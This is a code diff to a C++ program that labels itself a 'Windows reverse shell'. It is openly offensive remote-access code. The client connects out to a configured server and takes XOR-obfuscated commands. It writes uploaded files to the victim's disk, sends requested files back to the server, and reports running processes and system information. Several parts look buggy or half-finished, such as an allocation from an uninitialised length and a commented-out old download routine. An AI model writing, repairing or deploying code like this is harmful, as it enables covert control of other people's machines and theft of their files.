@@ -8,7 +8,9 @@ Windows reverse shell
 #include <stdio.h>
 #include <tlhelp32.h>
 #include <iostream>
+#include <fstream>
 #include <sstream>
+#include <cstring>
 #include <Lmcons.h>
 #include <wininet.h>
 #include <winsock.h>
@@ -227,42 +229,51 @@ std::string listProcesses() {
 }
 
 // Client uploads to server.
-void handle_upload(int sock){
-    char *p_char;
-    char tokenBuffer[1024];
-    char dataBuffer[1024];
-    int fileSize, bytesRead,over,received = 0;
-    char fileSizeBuf[1024];
-    FILE *fp = fopen("output","w+b");
-    // Receive first 1024 of file and parse out file size
-    // Bytes read has 12 subtracted to account for message header
-    recv(sock, fileSizeBuf, sizeof(fileSizeBuf), 0);
+int handle_upload(int sock, const char* filename){
+	char buf[DEFAULT_BUFLEN] = {0};
+	ofstream file(filename, ios::binary);
+	if (!file) {
+		printf("Failed to create file %s", filename); // debug
+		return 2;
+	}
 
-    xor_func(fileSizeBuf);
+	int bytesRecvd = 0;
+	while ((bytesRecvd = recv(sock, buf, DEFAULT_BUFLEN, 0)) > 0) {
+		file.write(xor_func(buf), bytesRecvd);
+	} 
 
-    printf("file size: %s\n",fileSizeBuf);  // Debug
-    fileSize = atoi(fileSizeBuf);
-    printf("file size = %d\n",fileSize);  // Debug
-    
-    while (bytesRead < fileSize){
-        received = recv(sock, tokenBuffer,1024,0);
-        bytesRead += received;
-        if (bytesRead > fileSize){
-            printf("fix da overage...");  //Debug
-            over = bytesRead - fileSize;
-        }
-        fileSize--;
-        strncpy(dataBuffer, xor_func(tokenBuffer), received - over);
-        fputs(dataBuffer,fp);
-    fclose(fp);
-    } 
-}
+	if (bytesRecvd < 0) {
+		printf("File receive error"); // debug
+		return 1;
+	}
+
+	printf("File %s Received successfully", filename); // debug
+	file.close();
+	return 0;
+} 
+
 
 // Client handles download from server.
-void handle_download(SOCKET sock, char * path) {
-	int filesize = 0;
+void handle_download(int sock, const char* filename) {
+	ifstream file(filename, ios::in | ios::binary);
+	if (!file.is_open()) {
+		printf("error creating file: %s\n", filename); // print error message
+	}
+
+	char buf[DEFAULT_BUFLEN];
+	while (!file.eof()) {
+		file.read(buf, DEFAULT_BUFLEN);
+		int bytes_read = file.gcount();
+		if (bytes_read > 0) {
+			if (send(sock, xor_func(buf), bytes_read, 0) < 0) {
+				printf("Failed to send data");
+				return;
+			}
+		}
+	}
+	
+	/*int filesize = 0;
 	int total_read = 0;
-	char buf[1024] = {0};
 	DWORD current_read_bytes = 0;
 	DWORD read_bytes = 0;
 
@@ -285,7 +296,7 @@ void handle_download(SOCKET sock, char * path) {
 	send(sock, (char *)&filesize, 4, 0);
 
 	while (total_read < filesize) {		
-		if (!ReadFile(fhandle, buf, 1024, &read_bytes, NULL)) {
+		if (!ReadFile(fhandle, buf, DEFAULT_BUFLEN, &read_bytes, NULL)) {
 			printf("ReadFile Error: %d", GetLastError());
 		}
 		total_read += read_bytes;
@@ -293,7 +304,7 @@ void handle_download(SOCKET sock, char * path) {
 		xor_func(buf, read_bytes);
 		send(sock, buf, read_bytes, 0);
 	}
-	CloseHandle(fhandle);
+	CloseHandle(fhandle);*/
 }
 
 int parseCmd(char cmd[]){
@@ -312,14 +323,16 @@ int parseCmd(char cmd[]){
 
 SOCKET getConnected() {
 	WSADATA wsaData;
-    SOCKET sock;
-    struct sockaddr_in address;
-    struct sockaddr_in server;
-	int connResult; 
+    SOCKET sock = INVALID_SOCKET;
+    //struct sockaddr_in address;
+    //struct sockaddr_in server;
+	struct addrinfo* result = NULL;
+	struct addrinfo hints;
 
-	struct addrinfo* result = NULL,
-		* ptr = NULL,
-		hints;
+	char* server = SERV_ADDR;
+	char recvbuf[DEFAULT_BUFLEN];
+	int revcbuflen = DEFAULT_BUFLEN;
+	int connResult;
 
 	connResult = WSAStartup(MAKEWORD(2,2), &wsaData);
 	if (connResult != 0) {
@@ -327,18 +340,13 @@ SOCKET getConnected() {
 		return 1;
 	}
 
-	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
-		printf("Socket creation failed: %d", WSAGetLastError());
-		WSACleanup();
-		return 1;
-	}
-
 	ZeroMemory(&hints, sizeof(hints));
-
-	hints.ai_family = AF_INET;	 // AF_UNSPEC can cause errors
-	hints.ai_socktype = SOCK_STREAM; // socket type: sock stream
-	hints.ai_protocol = IPPROTO_TCP; // IP protocol: TCP
-
+    hints.ai_family = AF_UNSPEC; // Use AF_UNSPEC bcs localhost
+    hints.ai_socktype = SOCK_STREAM; // socket type: sock stream
+    hints.ai_protocol = IPPROTO_TCP; // IP protocol: TCP
+    hints.ai_flags = AI_PASSIVE;
+	
+	// resolve server address and port
 	connResult = getaddrinfo(SERV_ADDR, SERV_PORT, &hints, &result);
 	if (connResult != 0) {
 		printf("getaddrinfo failed: %d\n", connResult);
@@ -346,26 +354,46 @@ SOCKET getConnected() {
 		return 1;
 	}
 
-	ptr = result;
+	// Attempt to connect to an address until one succeeds
+    for (struct addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next) {
 
-	connResult = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
-	if (connResult == SOCKET_ERROR) {
-		closesocket(sock);
-		printf("Connection failure.\n");
-		WSACleanup();
-		return 1;
-	}
+        // Create a SOCKET for connecting to server
+        sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+
+        if (sock == INVALID_SOCKET) {
+            printf("socket failed with error: %ld\n", WSAGetLastError());
+            WSACleanup();
+            return 1;
+        }
+
+        // Connect to server.
+        connResult = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
+        if (connResult == SOCKET_ERROR) {
+            printf("Connection failed with error: %d\n", WSAGetLastError());
+            closesocket(sock);
+            sock = INVALID_SOCKET;
+            continue;
+        }
+        break; //got a connection, or none worked
+    }
+
+	freeaddrinfo(result);
+
+	if (sock == INVALID_SOCKET) {
+        printf("Unable to connect to server!\n");
+        WSACleanup();
+        return 1;
+    }
 
     return sock;
 }
 
 int main(int argc, char const* argv[]) {
-	char filepath[4096];
+	string filepath;
 	int cmd;
 	int command_packet_len;
-	char buffer[1024] = {0};
-	char msg[1024];
-	char data[1024];
+	char buf[DEFAULT_BUFLEN];
+	char recvbuf[DEFAULT_BUFLEN];
 	SOCKET sock;
 	sock = getConnected();
 
@@ -373,44 +401,57 @@ int main(int argc, char const* argv[]) {
 
 	while(true) {
 		std::string procs;
+		
 		int getcmd;
+		memset(buf,0,DEFAULT_BUFLEN);
+		memset(recvbuf,0,DEFAULT_BUFLEN);
+		getcmd = recv(sock, recvbuf, DEFAULT_BUFLEN, 0); //read cmd into buffer from sock
+		/*
+		recv(sock, (char *)&command_packet_len, 4, 0);*/
 		
-		memset(buffer,0,sizeof(buffer));
-		memset(data,0,sizeof(data));
-		
-		/*// read command type
-		recv(sock, (char *)&command, 4, 0);
-		printf("Command type: %d\n", command);
-		// read command length
-		recv(sock, (char *)&command_packet_len, 4, 0);
-		
- 		char * path = (char *)malloc(command_packet_len);
+ 		char * filepath = (char *)malloc(command_packet_len);
 
-		ZeroMemory(path, command_packet_len);*/
+		ZeroMemory(filepath, command_packet_len);
 
-		getcmd = recv(sock, buffer, 1024, 0); //read cmd into buffer from sock
-		int cmd = parseCmd(xor_func(buffer));
+		
+		printf("enc: %s", recvbuf); // debug
+		int cmd = parseCmd(xor_func(recvbuf));
+		printf("dec: %s", recvbuf); // debug
+		printf("cmd int: %d", cmd); // debug
 
 		switch(cmd) {
 			case -1: //end
 				printf("Shutting down"); //debug
 				shutdown(sock, 2);
-				send(sock, msg, strlen(msg), 0);
+				send(sock, buf, strlen(buf), 0);
 				return 0;
 			case 0:
-				printf("Upload buffer is: %s\n", buffer);  //debug
-				handle_upload(sock); // receive the file
-            	sprintf(msg, "Received File"); // tell server client recieved the file
-            	xor_func(msg);
-            	send(sock, msg, strlen(msg), 0);
+				printf("From upload buffer: %s\n", buf);  //debug
+				const char* filename = "received_file.txt";
+				int confirm = handle_upload(sock, filename); // receive the file
+				if (confirm == 0) {
+					sprintf(buf, "Client Received File");
+				} else if (confirm == 2) {
+					sprintf(buf, "Client Failed to create file");
+				} else {
+					sprintf(buf, "File receive error");
+				}
+            	 // tell server client recieved the file (or not)
+            	xor_func(buf);
+            	send(sock, buf, strlen(buf), 0);
 				break;
 			case 1:
 				printf("Download"); // debug
+				// get filepath from server
+				int bytes_received = recv(sock, recvbuf, DEFAULT_BUFLEN, 0);				if (bytes_received < 0) {
+					printf("Failed to receive filepath"); // debug
+				}
+				filepath = recvbuf;
+				// recvbuf[bytes_received] = '\0';
+				
 
-				recv(sock, path, command_packet_len, 0); // fix
-				path[command_packet_len] = 0x00;
-
-				handle_download(sock, path); // fix
+				
+				handle_download(sock, filepath); // fix
 				// read command_packet_length bytes into filename
 				// open filename, send chunks back out socket
 				break;
@@ -420,17 +461,17 @@ int main(int argc, char const* argv[]) {
 				int offset = 0;
 				printf("list processes length: %d", procs.length());
 				while (offset < procs.length()) {
-					string chunk = procs.substr(offset, 1024);
+					string chunk = procs.substr(offset, DEFAULT_BUFLEN);
 					char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
 					xor_func(c); // xor the chunk
-					const char *chunkBuffer = c; // put xor'd chunk in buffer
+					const char *chunkBuffer = c; // put xor'd chunk in this temp buffer
 					printf("sending %d bytes", strlen(chunkBuffer));
 					send(sock, chunkBuffer, strlen(chunkBuffer), 0);
-					offset += 1024;
+					offset += DEFAULT_BUFLEN;
 				}
-				strcpy(data, "gettfouttahereistfg"); // send string to signify end of message
-				xor_func(data);
-				send(sock, data, strlen(data), 0);
+				strcpy(buf, "gettfouttahereistfg"); // send string to signify end of message
+				xor_func(buf);
+				send(sock, buf, strlen(buf), 0);
 				break;
 			case 3:
 				printf("systeminfo");
@@ -438,17 +479,17 @@ int main(int argc, char const* argv[]) {
 				int offset = 0;
 				printf("systeminfo length: %d", procs.length());
 				while (offset < procs.length()) {
-					string chunk = procs.substr(offset, 1024);
+					string chunk = procs.substr(offset, DEFAULT_BUFLEN);
 					char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
 					xor_func(c); // xor the chunk
-					const char *chunkBuffer = c; // put xor'd chunk in buffer
+					const char *chunkBuffer = c; // put xor'd chunk in this temp buffer
 					printf("sending %d bytes", strlen(chunkBuffer));
 					send(sock, chunkBuffer, strlen(chunkBuffer), 0); // send chunk
-					offset += 1024;
+					offset += DEFAULT_BUFLEN;
 				}
-				strcpy(data, "gettfouttahereistfg"); // send string to signify end of message
-				xor_func(data); // xor end string
-				send(sock, data, strlen(data), 0); //send end string
+				strcpy(buf, "gettfouttahereistfg"); // send string to signify end of message
+				xor_func(buf); // xor end string
+				send(sock, buf, strlen(buf), 0); //send end string
 				break;
 		}
 		//free(path);
